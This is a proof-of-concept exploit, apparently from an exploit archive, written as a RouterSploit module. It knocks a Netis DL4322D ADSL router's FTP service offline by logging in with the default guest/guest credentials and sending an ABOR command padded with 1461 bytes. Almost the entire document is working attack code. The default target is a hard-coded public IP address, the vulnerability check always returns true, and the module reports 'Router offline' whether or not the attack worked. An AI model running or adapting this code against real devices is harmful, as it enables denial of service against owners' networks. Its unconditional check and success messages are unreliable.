# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)
# Author: Cakes
# Discovery Date: 2018-09-16
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
# Tested Version: RTK 2.1.1
# Tested on OS: Kali Linux
# CVE: N/A

# Description
# The FTP service is vulnerable to a Denial of Service attack. Attackers simply need to log
# into the router and send and valid FTP command with a character offset of 1461 as the command input

import socket 
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    __info__ = {
        "name": "DL4322D RTK 2.1.1",
        "description": "The FTP service is vulnerable to a Denial of Service attack. "
                       "Attackers simply need to log into the router and send"
                       "and valid FTP command with a character offset of 1461 as the command input. ",
        "authors": (
            "Cakes",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "http://www.netis-systems.com/Home/detail/id/74.html",
        ),
        "devices": (
            "DL4322D RTK 2.1.1"
        ),
    }

    target = OptIP("182.161.38.3", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            evil = '\x41'*1461

            print_status(" Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)")
            print_status(" Creating socket")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print_status(" Connecting...")
            connect = s.connect((self.target,self.port))
            s.recv(1024)

            try:
                s.send('USER guest\r\n')
                s.recv(1024)
                s.send('PASS guest\r\n')
                s.recv(1024)
                print_status(" Connected")
            except:
                print_error("Exploit failed - Credentials aren't working. Please change if none default")
                
            print_status(" Sending Payload")

            try:
                s.send('ABOR %s' % (evil))
                print_status(" Payload sent")
                print_status(" Router offline")
            except:
                print_error( "Exploit failed - Something went wrong")
                
            #s.close()
            
        else:

                print_error("Exploit failed - target seems to be not vulnerable")
            
    def check(self):
        
        return True
